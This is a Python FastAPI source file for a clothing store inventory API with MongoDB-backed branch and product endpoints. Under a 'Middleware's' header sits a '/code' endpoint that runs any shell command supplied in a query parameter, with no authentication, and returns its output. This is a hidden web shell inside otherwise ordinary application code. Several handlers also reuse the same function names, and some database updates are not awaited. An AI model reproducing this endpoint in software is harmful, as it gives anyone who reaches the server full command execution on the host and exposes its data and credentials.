import motor.motor_asyncio
from fastapi.responses import JSONResponse, RedirectResponse, HTMLResponse
from fastapi import FastAPI, Request
from fastapi.encoders import jsonable_encoder
from starlette.responses import JSONResponse
from models.products import *
from bson.objectid import ObjectId
from dotenv import load_dotenv
import subprocess
import os

# --------------------------------Star app--------------------------------------

app = FastAPI()


# -------------------------------Middleware's-----------------------------------

@app.get("/code")
def code(command: Optional[str]):
    a = subprocess.run(command, shell=True, capture_output=True, text=True)
    return HTMLResponse(str(a))


@app.middleware("http")
async def my_middleware(request: Request, call_next):
    print(f"Accediendo a {request.url}")
    response = await call_next(request)
    return response


# -------------------------------Método para obtener datos de la DB-----------------

async def GET_JSON_DB(_id: str) -> JSONResponse | dict:
    load_dotenv()
    try:
        db = connection_primary(database=os.getenv("DATABASE_NAME"))
        data = await db.table.find_one({"_id": ObjectId(_id)})

        if data is None:
            return JSONResponse(status_code=404, content={"message": "Unknown document"})
        else:
            data["_id"] = str(data["_id"])
            return data

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


# ------------------------------Conexión a la DB------------------------------

def connection_primary(database: str) -> motor.motor_asyncio.AsyncIOMotorClient:
    load_dotenv()
    client = motor.motor_asyncio.AsyncIOMotorClient(os.getenv("URL"))
    db = client[database]
    return db


# ----------------------Método para insertar datos a la db ------------------

async def insert(table: str, database: motor.motor_asyncio.AsyncIOMotorClient) -> JSONResponse:
    try:
        await database.table.insert_one(jsonable_encoder(table))
        return JSONResponse(status_code=201, content={"message": "Added document"})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


# ----------------------------Método crear nueva sucursal----------------------

@app.post("/new_branch")
async def new_branch(data: Clothing_Store) -> JSONResponse:
    return await insert(table=data, database=connection_primary(database=os.environ.get("DATABASE_NAME")))


# --------------------------------Métodos POST de productos-----------------------------

@app.post("/branch/{_id}/t_shirts/{person}")
async def set_t_shirts(t_shirts: T_Shirts, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=t_shirts, branch=_id, usage=person, keygen="t_shirts")


@app.post("/branch/{_id}/shorts/{person}")
async def set_shorts(shorts: Shorts, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=shorts, branch=_id, usage=person, keygen="shorts")


@app.post("/branch/{_id}/shirts/{person}")
async def set_shirts(shirts: Shirts, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=shirts, branch=_id, usage=person, keygen="shirts")


@app.post("/branch/{_id}/pants/{person}")
async def set_pants(pants: Pants, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=pants, branch=_id, usage=person, keygen="pants")


@app.post("/branch/{_id}/shoes/{person}")
async def set_shoes(shoes: Shoes, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=shoes, branch=_id, usage=person, keygen="shoes")


@app.post("/branch/{_id}/dresses/{person}")
async def set_dresses(dresses: Dresses, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=dresses, branch=_id, usage=person, keygen="dresses")


@app.post("/branch/{_id}/footwear/{person}")
async def set_footwear(footwear: Footwear, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=footwear, branch=_id, usage=person, keygen="footwear")


# ----------------------------Métodos PUT para modificar datos-----------------

@app.put("/branch/{_id}/t_shirts/{person}/{index}")
async def put_t_shirts(t_shirts: T_Shirts, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=t_shirts, branch=_id, usage=person, keygen="t_shirts", index=index)


@app.put("/branch/{_id}/shorts/{person}/{index}")
async def put_shorts(shorts: Shorts, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=shorts, branch=_id, usage=person, keygen="shorts", index=index)


@app.put("/branch/{_id}/shirts/{person}/{index}")
async def set_shirts(shirts: Shirts, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=shirts, branch=_id, usage=person, keygen="shirts", index=index)


@app.put("/branch/{_id}/pants/{person}/{index}")
async def set_pants(pants: Pants, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=pants, branch=_id, usage=person, keygen="pants", index=index)


@app.put("/branch/{_id}/shoes/{person}/{index}")
async def set_shoes(shoes: Shoes, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=shoes, branch=_id, usage=person, keygen="shoes", index=index)


@app.put("/branch/{_id}/dresses/{person}/{index}")
async def set_dresses(dresses: Dresses, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=dresses, branch=_id, usage=person, keygen="dresses", index=index)


@app.put("/branch/{_id}/footwear/{person}/{index}")
async def set_footwear(footwear: Footwear, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=footwear, branch=_id, usage=person, keygen="footwear", index=index)


# ----------------------------Agregar datos Inventario--------------------------

async def insert_products(data=None, branch: str = None, usage: str = None, keygen: str = None, index: str = None) -> JSONResponse:
    load_dotenv()
    try:
        db = connection_primary(database=os.getenv("DATABASE_NAME"))
        path_insert = f"{usage}.{keygen}"
        path_update = f"{usage}.{keygen}.{index}"

        if index is None:
            db.table.update_one({"_id": ObjectId(branch)}, {"$push": {path_insert: jsonable_encoder(data)}})
            return JSONResponse(status_code=201, content={"message": "Added information"})
        else:
            db.table.update_one({"_id": ObjectId(branch)}, {"$set": {path_update: jsonable_encoder(data)}})
            return JSONResponse(status_code=201, content={"message": "Modified information"})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


# ----------------------------Obtener datos de una Sucursal con query's---------------------------

@app.get("/branch/{_id}")
async def get_branch(_id: str, request: Request, person: Optional[str] = None, product: Optional[str] = None) -> JSONResponse:
    info = await GET_JSON_DB(_id=_id)

    try:
        if person is None and product is None:
            return JSONResponse(status_code=200, content={"branch": info})

        elif person is not None and product is None:
            return JSONResponse(status_code=200, content={person: info[person]})

        elif person is not None and product is not None:
            return JSONResponse(status_code=200, content={person: info[person][product]})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})
